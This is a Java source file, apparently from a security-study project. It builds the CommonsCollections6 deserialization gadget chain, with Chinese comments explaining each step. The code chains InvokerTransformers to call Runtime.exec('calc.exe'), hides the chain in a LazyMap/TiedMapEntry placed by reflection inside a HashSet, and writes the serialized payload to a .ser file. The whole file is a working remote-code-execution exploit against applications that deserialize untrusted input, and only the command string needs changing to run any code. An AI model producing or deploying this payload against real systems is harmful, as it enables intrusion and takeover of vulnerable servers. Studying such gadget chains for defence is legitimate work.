package CommonsCollections6;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import java.lang.reflect.Method;
import java.lang.Class;
import java.lang.Runtime;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class exp {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException, IOException {
        //构造内部转换链
        Transformer[] trans = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class,Class[].class},
                        new Object[]{"getRuntime",new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class,Object[].class},
                        new Object[]{null,null}),
                new InvokerTransformer("exec",
                        new Class[]{String.class},new Object[]{"calc.exe"}
                        )
        };
        ChainedTransformer chain = new ChainedTransformer(trans);
        HashMap innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, chain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "tr1ple2333");

        innerMap.clear();


        //构造外部入口链
        HashSet newSet = new HashSet(1);
        newSet.add("tr1ple");

        Field innerSetMap  = HashSet.class.getDeclaredField("map");
        innerSetMap.setAccessible(true);
        //修改hashset内部的hashmap存储
        HashMap setMap = (HashMap)innerSetMap.get(newSet);
        Field table = HashMap.class.getDeclaredField("table");
        table.setAccessible(true);
        //拿到存储的数据
        Object[] obj = (Object[])table.get(setMap);
        Object node  = obj[0];

        System.out.println(node.getClass().getName());
        Method[] methods  = node.getClass().getMethods();


        for(int i=0;i<methods.length;i++){
            System.out.println(methods[i].getName());
        }


        //拿到此时存到hashset中的node节点，key为要修改的点，这里需要修改它为真正的payload，即Tiedmapentry
        System.out.println(node.toString());

        Field key = node.getClass().getDeclaredField("key");
        key.setAccessible(true);
        key.set(node,entry);

        //hashset的hashmap中的node节点修改完值以后放进hashset
        Field finalMap = newSet.getClass().getDeclaredField("map");
        finalMap.setAccessible(true);
        finalMap.set(newSet,setMap);

        //序列化
        File file;
        file = new File(System.getProperty("user.dir")+"/javasec-ysoserial/src/main/resources/commonscollections6.ser");
        ObjectOutputStream objOut = new ObjectOutputStream(new FileOutputStream(file));
        objOut.writeObject(newSet);

    }
}
